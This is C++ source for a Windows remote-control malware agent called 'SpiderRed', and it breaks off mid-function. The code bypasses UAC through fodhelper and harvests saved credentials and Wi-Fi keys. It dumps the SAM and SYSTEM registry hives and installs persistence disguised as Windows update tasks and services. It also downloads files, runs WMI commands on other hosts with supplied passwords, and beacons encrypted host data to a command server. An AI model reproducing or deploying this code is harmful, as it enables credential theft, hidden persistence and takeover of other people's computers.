// spiderred_final.cpp - Agente C2 COMPLETO Y COMPILABLE
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <fstream>
#include <sstream>
#include <map>
#include <random>
#include <ctime>
#include <iomanip>
#include <direct.h>
#include <Lmcons.h>
#include <Shlobj.h>
#include <urlmon.h>
#include <wtsapi32.h>
#include <algorithm>  // Añadir esto para std::remove

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "192.168.254.137"
#define C2_PORT 8443
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define CHECKIN_INTERVAL 60
#define JITTER 30
#define MASTER_KEY "SpiderRedMasterKey2024!@#$%"

// ==================== UTILIDADES ====================
namespace Utils {
    std::string GetCurrentTime() {
        time_t now = time(0);
        char buf[80];
        ctime_s(buf, sizeof(buf), &now);
        std::string str(buf);
        str.erase(std::remove(str.begin(), str.end(), '\n'), str.end());
        return str;
    }

    std::string GetComputerName() {
        char name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(name);
        ::GetComputerNameA(name, &size);
        return std::string(name);
    }

    std::string GetUserName() {
        char name[UNLEN + 1];
        DWORD size = sizeof(name);
        ::GetUserNameA(name, &size);
        return std::string(name);
    }

    std::string GetDomain() {
        char domain[256];
        DWORD size = sizeof(domain);
        if (::GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            return std::string(domain);
        }
        return "WORKGROUP";
    }

    bool IsElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;

        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        bool isElevated = false;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                               sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated != 0;
        }
        
        CloseHandle(hToken);
        return isElevated;
    }

    std::string GetOSVersion() {
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osvi);

        std::stringstream ss;
        ss << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "."
           << osvi.dwBuildNumber;
        if (osvi.wProductType == VER_NT_WORKSTATION) {
            ss << " Workstation";
        } else {
            ss << " Server";
        }
        return ss.str();
    }

    std::string GetArchitecture() {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
            case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
            case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
            default: return "Unknown";
        }
    }

    std::string ExecuteCommand(const std::string& cmd, DWORD timeout = 30000) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));

        std::string fullCmd = "cmd.exe /c " + cmd;
        char* cmdLine = _strdup(fullCmd.c_str());

        std::string output;
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);

            WaitForSingleObject(pi.hProcess, timeout);

            char buffer[4096];
            DWORD bytesRead;
            while (::ReadFile(hStdoutRd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                output.append(buffer, bytesRead);
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        CloseHandle(hStdoutRd);
        free(cmdLine);
        return output;
    }

    std::string ExecutePowerShell(const std::string& script) {
        std::string cmd = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"" + script + "\"";
        return ExecuteCommand(cmd);
    }

    std::vector<std::string> Split(const std::string& s, char delimiter) {
        std::vector<std::string> tokens;
        std::string token;
        std::istringstream tokenStream(s);
        while (std::getline(tokenStream, token, delimiter)) {
            tokens.push_back(token);
        }
        return tokens;
    }

    bool FileExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    bool DirectoryExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    std::string ReadFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return "";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return content;
    }

    bool WriteFile(const std::string& path, const std::string& content) {
        std::ofstream file(path, std::ios::binary);
        if (!file) return false;
        
        file.write(content.c_str(), content.size());
        return true;
    }

    std::string GetTempPath() {
        char path[MAX_PATH];
        ::GetTempPathA(MAX_PATH, path);
        return std::string(path);
    }

    std::string GetAppDataPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        return std::string(path);
    }

    std::string GetDesktopPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
        return std::string(path);
    }

    std::string GetSystemPath() {
        char path[MAX_PATH];
        GetSystemDirectoryA(path, MAX_PATH);
        return std::string(path);
    }

    std::string Base64Encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                            buffer.data(), &len);
        return std::string(buffer.data(), buffer.size() - 1);
    }

    std::string Base64Decode(const std::string& input) {
        DWORD len = 0;
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
        return std::string(reinterpret_cast<char*>(buffer.data()), len);
    }

    std::string XOREncrypt(const std::string& data, const std::string& key) {
        std::string result;
        for (size_t i = 0; i < data.size(); i++) {
            result += data[i] ^ key[i % key.size()];
        }
        return result;
    }

    std::string GetCurrentExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }

    std::string GetRandomString(size_t length) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

        std::string result;
        for (size_t i = 0; i < length; ++i) {
            result += alphanum[dis(gen)];
        }
        return result;
    }
}

// ==================== MÓDULO DE RECOLECCIÓN ====================
class InfoCollector {
public:
    static std::string CollectAll() {
        std::stringstream ss;
        
        ss << "=== SYSTEM INFORMATION ===\n\n";
        
        // Información básica
        ss << "Hostname: " << Utils::GetComputerName() << "\n";
        ss << "Username: " << Utils::GetUserName() << "\n";
        ss << "Domain: " << Utils::GetDomain() << "\n";
        ss << "OS: Windows " << Utils::GetOSVersion() << "\n";
        ss << "Architecture: " << Utils::GetArchitecture() << "\n";
        ss << "Elevated: " << (Utils::IsElevated() ? "Yes (Administrator)" : "No (User)") << "\n";
        ss << "Time: " << Utils::GetCurrentTime() << "\n";
        
        // Hardware
        ss << "\n=== HARDWARE INFORMATION ===\n\n";
        ss << "CPU Info:\n";
        ss << Utils::ExecuteCommand("wmic cpu get name");
        ss << "\nRAM Info:\n";
        ss << Utils::ExecuteCommand("wmic memorychip get capacity");
        
        // Usuarios y grupos
        ss << "\n=== USER INFORMATION ===\n\n";
        ss << "Local Users:\n";
        ss << Utils::ExecuteCommand("net user");
        ss << "\nLocal Groups:\n";
        ss << Utils::ExecuteCommand("net localgroup");
        
        // Red
        ss << "\n=== NETWORK INFORMATION ===\n\n";
        ss << "IP Configuration:\n";
        ss << Utils::ExecuteCommand("ipconfig /all");
        ss << "\nNetwork Connections:\n";
        ss << Utils::ExecuteCommand("netstat -ano | findstr ESTABLISHED");
        ss << "\nARP Cache:\n";
        ss << Utils::ExecuteCommand("arp -a");
        
        // Procesos
        ss << "\n=== PROCESS INFORMATION ===\n\n";
        ss << "Running Processes (top 20):\n";
        ss << Utils::ExecuteCommand("tasklist | findstr /v \"Image Name\" | head -20");
        
        // Servicios
        ss << "\n=== SERVICE INFORMATION ===\n\n";
        ss << "Running Services:\n";
        ss << Utils::ExecuteCommand("net start");
        
        // Discos
        ss << "\n=== DISK INFORMATION ===\n\n";
        ss << "Disk Drives:\n";
        ss << Utils::ExecuteCommand("wmic logicaldisk get caption,size,freespace");
        
        // Software instalado
        ss << "\n=== INSTALLED SOFTWARE ===\n\n";
        ss << "Programs (32-bit):\n";
        ss << Utils::ExecuteCommand("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | findstr /B /C:\"DisplayName\" | head -10");
        
        return ss.str();
    }
};

// ==================== MÓDULO DE ESCALADA DE PRIVILEGIOS ====================
class PrivilegeEscalation {
public:
    static std::string CheckAll() {
        std::stringstream ss;
        
        ss << "=== PRIVILEGE ESCALATION CHECKS ===\n\n";
        
        ss << "[1] Current Privileges:\n";
        if (Utils::IsElevated()) {
            ss << "[+] Already running as Administrator\n";
        } else {
            ss << "[-] Running as normal user\n";
        }
        ss << Utils::ExecuteCommand("whoami /priv");
        
        ss << "\n[2] UAC Status:\n";
        HKEY hKey;
        DWORD uacValue = 1;
        DWORD size = sizeof(uacValue);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueExA(hKey, "EnableLUA", NULL, NULL,
                                (LPBYTE)&uacValue, &size) == ERROR_SUCCESS) {
                if (uacValue == 0) {
                    ss << "[+] UAC is DISABLED!\n";
                } else {
                    ss << "[-] UAC is enabled (Level: " << uacValue << ")\n";
                }
            }
            RegCloseKey(hKey);
        }
        
        ss << "\n[3] AlwaysInstallElevated:\n";
        ss << CheckAlwaysInstallElevated();
        
        ss << "\n[4] Services Running as SYSTEM:\n";
        ss << Utils::ExecutePowerShell(
            "Get-Service | Where-Object {$_.StartName -eq 'LocalSystem'} | "
            "Select-Object -First 5 Name, DisplayName | Format-Table"
        );
        
        ss << "\n[5] Scheduled Tasks as SYSTEM:\n";
        ss << Utils::ExecuteCommand("schtasks /query /fo LIST | findstr /i \"system\" | head -5");
        
        ss << "\n[6] Unquoted Service Paths:\n";
        ss << Utils::ExecutePowerShell(
            "Get-WmiObject -Class Win32_Service | "
            "Where-Object {$_.PathName -notlike '\"*\"' -and $_.PathName -like '* *'} | "
            "Select-Object -First 3 Name, PathName | Format-Table"
        );
        
        return ss.str();
    }

    static std::string Exploit() {
        std::stringstream ss;
        
        ss << "=== PRIVILEGE ESCALATION ATTEMPTS ===\n\n";
        
        // 1. FodHelper UAC Bypass
        ss << "[1] Trying FodHelper UAC Bypass...\n";
        ss << TryFodHelperBypass();
        
        // 2. Service Exploitation
        ss << "\n[2] Checking for Vulnerable Services...\n";
        ss << Utils::ExecutePowerShell(
            "Get-Service | Where-Object {$_.StartName -eq 'LocalSystem'} | "
            "Select-Object Name, PathName | "
            "Where-Object {$_.PathName -like '* *'} | "
            "Format-Table"
        );
        
        // 3. Token Manipulation
        ss << "\n[3] Checking for Token Privileges...\n";
        std::string tokens = Utils::ExecuteCommand("whoami /priv | findstr /i \"SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege\"");
        if (!tokens.empty()) {
            ss << "[+] Token privileges found!\n" << tokens << "\n";
            ss << "[+] Can try tools like PrintSpoofer, JuicyPotato, RogueWinRM\n";
        } else {
            ss << "[-] No token privileges found\n";
        }
        
        return ss.str();
    }

private:
    static std::string CheckAlwaysInstallElevated() {
        HKEY hKey;
        DWORD value = 0;
        DWORD size = sizeof(value);
        bool hklm = false, hkcu = false;
        
        // HKLM
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
                hklm = true;
            }
            RegCloseKey(hKey);
        }
        
        // HKCU
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                         "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                                (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
                hkcu = true;
            }
            RegCloseKey(hKey);
        }
        
        if (hklm && hkcu) {
            return "[+] AlwaysInstallElevated is ENABLED in both HKLM and HKCU!\n";
        } else if (hklm || hkcu) {
            return "[?] AlwaysInstallElevated partially enabled\n";
        } else {
            return "[-] AlwaysInstallElevated not enabled\n";
        }
    }

    static std::string TryFodHelperBypass() {
        try {
            // Crear entrada en registro
            HKEY hKey;
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                               "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                               0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                
                std::string cmd = "cmd.exe /c echo [UAC_BYPASS_SUCCESS] > C:\\Windows\\Temp\\uac_test.txt";
                RegSetValueExA(hKey, "", 0, REG_SZ,
                              (const BYTE*)cmd.c_str(), cmd.length() + 1);
                
                RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
                RegCloseKey(hKey);

                // Ejecutar fodhelper
                ShellExecuteA(NULL, "runas", "fodhelper.exe", NULL, NULL, SW_HIDE);
                
                Sleep(3000);
                
                // Limpiar
                RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
                
                // Verificar éxito
                if (Utils::FileExists("C:\\Windows\\Temp\\uac_test.txt")) {
                    DeleteFileA("C:\\Windows\\Temp\\uac_test.txt");
                    return "[+] FodHelper UAC bypass successful!\n";
                }
            }
        } catch (...) {}
        
        return "[-] FodHelper UAC bypass failed\n";
    }
};

// ==================== MÓDULO DE CREDENCIALES ====================
class CredentialHarvester {
public:
    static std::string HarvestAll() {
        std::stringstream ss;
        
        ss << "=== CREDENTIAL HARVESTING ===\n\n";
        
        ss << "[1] Windows Credential Manager:\n";
        ss << Utils::ExecuteCommand("cmdkey /list");
        
        ss << "\n[2] Browser Credential Paths:\n";
        std::string chrome = Utils::GetAppDataPath() + "\\Local\\Google\\Chrome\\User Data";
        std::string firefox = Utils::GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles";
        std::string edge = Utils::GetAppDataPath() + "\\Local\\Microsoft\\Edge\\User Data";
        
        if (Utils::DirectoryExists(chrome)) ss << "[*] Chrome: " << chrome << "\n";
        if (Utils::DirectoryExists(firefox)) ss << "[*] Firefox: " << firefox << "\n";
        if (Utils::DirectoryExists(edge)) ss << "[*] Edge: " << edge << "\n";
        
        ss << "\n[3] Searching for Password Files:\n";
        std::string search = Utils::ExecuteCommand(
            "dir C:\\Users\\ /s /b 2>nul | findstr /i \"pass cred login secret .kdbx .txt\" | head -10"
        );
        if (!search.empty()) {
            ss << search << "\n";
        } else {
            ss << "[-] No obvious password files found\n";
        }
        
        ss << "\n[4] Saved WiFi Passwords:\n";
        ss << Utils::ExecuteCommand("netsh wlan show profiles | findstr All");
        ss << Utils::ExecuteCommand("for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr All') do @netsh wlan show profile name=\"%a\" key=clear | findstr Key");
        
        ss << "\n[5] Recent Files (RDP, configs):\n";
        ss << Utils::ExecuteCommand("dir %USERPROFILE%\\Documents\\*.rdp /b 2>nul");
        ss << Utils::ExecuteCommand("dir %APPDATA%\\*.config /b 2>nul");
        
        return ss.str();
    }

    static std::string DumpSAM() {
        if (!Utils::IsElevated()) {
            return "[-] Administrator privileges required to dump SAM\n";
        }
        
        std::stringstream ss;
        
        ss << "[+] Dumping SAM registry hives...\n";
        
        // Guardar SAM y SYSTEM
        ss << Utils::ExecuteCommand("reg save hklm\\sam C:\\Windows\\Temp\\sam.save 2>&1");
        ss << Utils::ExecuteCommand("reg save hklm\\system C:\\Windows\\Temp\\system.save 2>&1");
        ss << Utils::ExecuteCommand("reg save hklm\\security C:\\Windows\\Temp\\security.save 2>&1");
        
        // Leer y verificar
        std::string sam = Utils::ReadFile("C:\\Windows\\Temp\\sam.save");
        std::string system = Utils::ReadFile("C:\\Windows\\Temp\\system.save");
        
        if (!sam.empty() && !system.empty()) {
            ss << "[+] SAM hive: " << sam.size() << " bytes\n";
            ss << "[+] SYSTEM hive: " << system.size() << " bytes\n";
            ss << "[+] SECURITY hive saved\n";
            
            // Intentar extraer hashes
            ss << "\n[+] Trying to extract password hashes:\n";
            ss << Utils::ExecuteCommand("reg query \"HKLM\\SAM\\SAM\\Domains\\Account\\Users\" /s 2>nul | findstr /i \"V F\" | head -5");
            
            // Limpiar
            DeleteFileA("C:\\Windows\\Temp\\sam.save");
            DeleteFileA("C:\\Windows\\Temp\\system.save");
            DeleteFileA("C:\\Windows\\Temp\\security.save");
            
            ss << "\n[+] Use mimikatz or secretsdump.py to extract hashes from saved hives\n";
        } else {
            ss << "[-] Failed to dump SAM registry hives\n";
        }
        
        return ss.str();
    }
};

// ==================== MÓDULO DE PERSISTENCIA ====================
class PersistenceModule {
public:
    static std::string Establish() {
        std::stringstream ss;
        
        ss << "=== ESTABLISHING PERSISTENCE ===\n\n";
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        // 1. Registry Run Key
        ss << "[1] Registry Run Key:\n";
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, "SpiderRedAgent", 0, REG_SZ,
                          (const BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hKey);
            ss << "[+] Added to HKCU\\Run\n";
        } else {
            ss << "[-] Failed to add to registry\n";
        }
        
        // 2. Scheduled Task
        ss << "\n[2] Scheduled Task:\n";
        std::string taskCmd = "schtasks /create /tn \"WindowsUpdateCheck\" /tr \"" + 
                             std::string(exePath) + "\" /sc minute /mo 5 /f 2>&1";
        std::string taskResult = Utils::ExecuteCommand(taskCmd);
        if (taskResult.find("SUCCESS") != std::string::npos || taskResult.empty()) {
            ss << "[+] Scheduled task created\n";
        } else {
            ss << "[-] Scheduled task: " << taskResult << "\n";
        }
        
        // 3. Startup Folder
        ss << "\n[3] Startup Folder:\n";
        char startupPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
        std::string dest = std::string(startupPath) + "\\SpiderRed.exe";
        
        if (CopyFileA(exePath, dest.c_str(), FALSE)) {
            ss << "[+] Copied to Startup folder: " << dest << "\n";
        } else if (GetLastError() == ERROR_ACCESS_DENIED) {
            ss << "[-] Access denied to Startup folder\n";
        } else {
            ss << "[-] Failed to copy to Startup folder\n";
        }
        
        // 4. Service (requires admin)
        if (Utils::IsElevated()) {
            ss << "\n[4] Windows Service:\n";
            ss << Utils::ExecutePowerShell(
                "$serviceName = 'SpiderRedSvc'; "
                "$exePath = '" + std::string(exePath) + "'; "
                "New-Service -Name $serviceName -BinaryPathName $exePath -StartupType Automatic -Description 'Windows Update Service' -ErrorAction SilentlyContinue; "
                "if ($?) { '[+] Service created' } else { '[-] Service creation failed' }"
            );
        }
        
        // 5. Winlogon (requires admin)
        if (Utils::IsElevated()) {
            ss << "\n[5] Winlogon Notify:\n";
            HKEY hKeyWinlogon;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                             "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                             0, KEY_WRITE, &hKeyWinlogon) == ERROR_SUCCESS) {
                
                RegSetValueExA(hKeyWinlogon, "Shell", 0, REG_SZ,
                              (const BYTE*)"explorer.exe,SpiderRedAgent", 26);
                RegCloseKey(hKeyWinlogon);
                ss << "[+] Winlogon persistence added\n";
            } else {
                ss << "[-] Winlogon access denied\n";
            }
        }
        
        return ss.str();
    }
};

// ==================== MÓDULO DE ARCHIVOS Y EXFILTRACIÓN ====================
class FileModule {
public:
    static std::string Upload(const std::string& localPath) {
        if (!Utils::FileExists(localPath)) {
            return "[-] File not found: " + localPath;
        }
        
        std::string content = Utils::ReadFile(localPath);
        if (content.empty()) {
            return "[-] File is empty or cannot be read";
        }
        
        std::string encoded = Utils::Base64Encode(content);
        
        std::stringstream ss;
        ss << "[+] File: " << localPath << "\n";
        ss << "[+] Size: " << content.size() << " bytes\n";
        ss << "[+] Base64 encoded: " << encoded.size() << " bytes\n";
        ss << "[+] First 100 chars of Base64: " << encoded.substr(0, 100) << "...\n";
        ss << "[+] Ready for exfiltration\n";
        
        return ss.str();
    }

    static std::string Download(const std::string& url, const std::string& savePath) {
        std::stringstream ss;
        
        ss << "[+] Downloading from: " << url << "\n";
        ss << "[+] Saving to: " << savePath << "\n";
        
        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), savePath.c_str(), 0, NULL);
        
        if (hr == S_OK) {
            ss << "[+] Download successful\n";
            
            // Verificar archivo
            if (Utils::FileExists(savePath)) {
                std::string content = Utils::ReadFile(savePath);
                ss << "[+] File size: " << content.size() << " bytes\n";
            }
        } else {
            ss << "[-] Download failed with error: " << hr << "\n";
            
            // Mensajes de error comunes
            if (hr == INET_E_DOWNLOAD_FAILURE) ss << "[-] Network download failure\n";
            else if (hr == E_OUTOFMEMORY) ss << "[-] Out of memory\n";
            else if (hr == E_ACCESSDENIED) ss << "[-] Access denied\n";
        }
        
        return ss.str();
    }

    static std::string ListDirectory(const std::string& path) {
        std::string cmd = "dir \"" + path + "\"";
        return Utils::ExecuteCommand(cmd);
    }
};

// ==================== MÓDULO DE MOVIMIENTO LATERAL ====================
class LateralMovement {
public:
    static std::string EnumerateShares() {
        std::stringstream ss;
        
        ss << "=== NETWORK SHARE ENUMERATION ===\n\n";
        
        ss << "[1] Network View:\n";
        ss << Utils::ExecuteCommand("net view");
        
        ss << "\n[2] All Shares on This Host:\n";
        ss << Utils::ExecuteCommand("net share");
        
        ss << "\n[3] Active Sessions:\n";
        ss << Utils::ExecuteCommand("net session 2>nul");
        
        ss << "\n[4] Mapped Drives:\n";
        ss << Utils::ExecuteCommand("net use");
        
        return ss.str();
    }

    static std::string PSExec(const std::string& host, const std::string& user, 
                              const std::string& pass, const std::string& command) {
        std::stringstream ps;
        
        ps << "$computer = '" << host << "'; ";
        ps << "$username = '" << user << "'; ";
        ps << "$password = '" << pass << "'; ";
        ps << "$command = '" << command << "'; ";
        ps << "$secpass = ConvertTo-SecureString $password -AsPlainText -Force; ";
        ps << "$cred = New-Object System.Management.Automation.PSCredential($username, $secpass); ";
        ps << "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command ";
        ps << "-ComputerName $computer -Credential $cred; ";
        
        return Utils::ExecutePowerShell(ps.str());
    }
};

// ==================== COMUNICACIÓN C2 ====================
class C2Communicator {
private:
    std::string agent_id;
    std::string session_key;
    
public:
    C2Communicator() {
        agent_id = GenerateAgentID();
        session_key = MASTER_KEY;
    }
    
    std::string SendBeacon() {
        std::stringstream json;
        
        json << "{";
        json << "\"type\":\"beacon\",";
        json << "\"agent_id\":\"" << agent_id << "\",";
        json << "\"hostname\":\"" << Utils::GetComputerName() << "\",";
        json << "\"username\":\"" << Utils::GetUserName() << "\",";
        json << "\"domain\":\"" << Utils::GetDomain() << "\",";
        json << "\"os\":\"Windows " << Utils::GetOSVersion() << "\",";
        json << "\"arch\":\"" << Utils::GetArchitecture() << "\",";
        json << "\"privileges\":\"" << (Utils::IsElevated() ? "High" : "Medium") << "\",";
        json << "\"timestamp\":\"" << Utils::GetCurrentTime() << "\",";
        json << "\"status\":\"active\"";
        json << "}";
        
        return SendToC2("/beacon", json.str());
    }
    
    std::string SendCommandResult(int cmd_id, const std::string& result) {
        std::stringstream json;
        
        json << "{";
        json << "\"type\":\"result\",";
        json << "\"command_id\":" << cmd_id << ",";
        json << "\"agent_id\":\"" << agent_id << "\",";
        json << "\"output\":\"" << EscapeJSON(result) << "\"";
        json << "}";
        
        return SendToC2("/result", json.str());
    }
    
    std::vector<std::pair<int, std::string>> GetCommands() {
        // Simular comandos para prueba
        std::vector<std::pair<int, std::string>> commands;
        commands.push_back({1, "info"});
        commands.push_back({2, "shell whoami /all"});
        commands.push_back({3, "creds all"});
        commands.push_back({4, "privesc check"});
        commands.push_back({5, "persist"});
        commands.push_back({6, "lateral shares"});
        return commands;
    }
    
private:
    std::string GenerateAgentID() {
        std::stringstream ss;
        ss << "SR-" << Utils::GetComputerName() << "-" 
           << Utils::GetUserName() << "-" 
           << GetTickCount64();
        return ss.str();
    }
    
    std::string SendToC2(const std::string& endpoint, const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT,
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) {
            #ifdef _DEBUG
            std::cout << "[DEBUG] InternetOpen failed: " << GetLastError() << std::endl;
            #endif
            return "";
        }
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT,
                                            NULL, NULL, INTERNET_SERVICE_HTTP,
                                            0, 0);
        if (!hConnect) {
            #ifdef _DEBUG
            std::cout << "[DEBUG] InternetConnect failed: " << GetLastError() << std::endl;
            #endif
            InternetCloseHandle(hInternet);
            return "";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(),
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_RELOAD |
                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            #ifdef _DEBUG
            std::cout << "[DEBUG] HttpOpenRequest failed" << std::endl;
            #endif
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        // Cifrar datos (XOR + Base64)
        std::string encrypted = Utils::XOREncrypt(data, session_key);
        std::string b64_data = Utils::Base64Encode(encrypted);
        
        #ifdef _DEBUG
        std::cout << "[DEBUG] Sending to " << endpoint << std::endl;
        std::cout << "[DEBUG] Original data: " << data << std::endl;
        std::cout << "[DEBUG] Encrypted data (Base64): " << b64_data.substr(0, 50) << "..." << std::endl;
        #endif
        
        std::string headers = "Content-Type: application/octet-stream\r\n";
        headers += "X-Agent-ID: " + agent_id + "\r\n";
        headers += "User-Agent: " + std::string(USER_AGENT) + "\r\n";
        
        std::string response;
        if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                            (LPVOID)b64_data.c_str(), (DWORD)b64_data.length())) {
            
            char buffer[4096];
            DWORD bytes_read = 0;
            
            while (InternetReadFile(hRequest, buffer, sizeof(buffer),
                                   &bytes_read) && bytes_read > 0) {
                response.append(buffer, bytes_read);
            }
            
            #ifdef _DEBUG
            if (!response.empty()) {
                std::cout << "[DEBUG] Server response: " << response.substr(0, 100) << "..." << std::endl;
            } else {
                std::cout << "[DEBUG] No response from server" << std::endl;
            }
            #endif
            
            // Descifrar respuesta
            if (!response.empty()) {
                std::string decoded = Utils::Base64Decode(response);
                std::string decrypted = Utils::XOREncrypt(decoded, session_key);
                response = decrypted;
            }
        } else {
            #ifdef _DEBUG
            std::cout << "[DEBUG] HttpSendRequest failed: " << GetLastError() << std::endl;
            #endif
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
    std::string EscapeJSON(const std::string& s) {
        std::string result;
        for (char c : s) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default: result += c; break;
            }
        }
        return result;
    }
};

// ==================== AGENTE PRINCIPAL ====================
class SpiderRedAgent {
private:
    C2Communicator communicator;
    std::atomic<bool> running;
    std::thread beacon_thread;
    
public:
    SpiderRedAgent() : running(false) {
        Initialize();
    }
    
    ~SpiderRedAgent() {
        Stop();
    }
    
    void Start() {
        running.store(true);
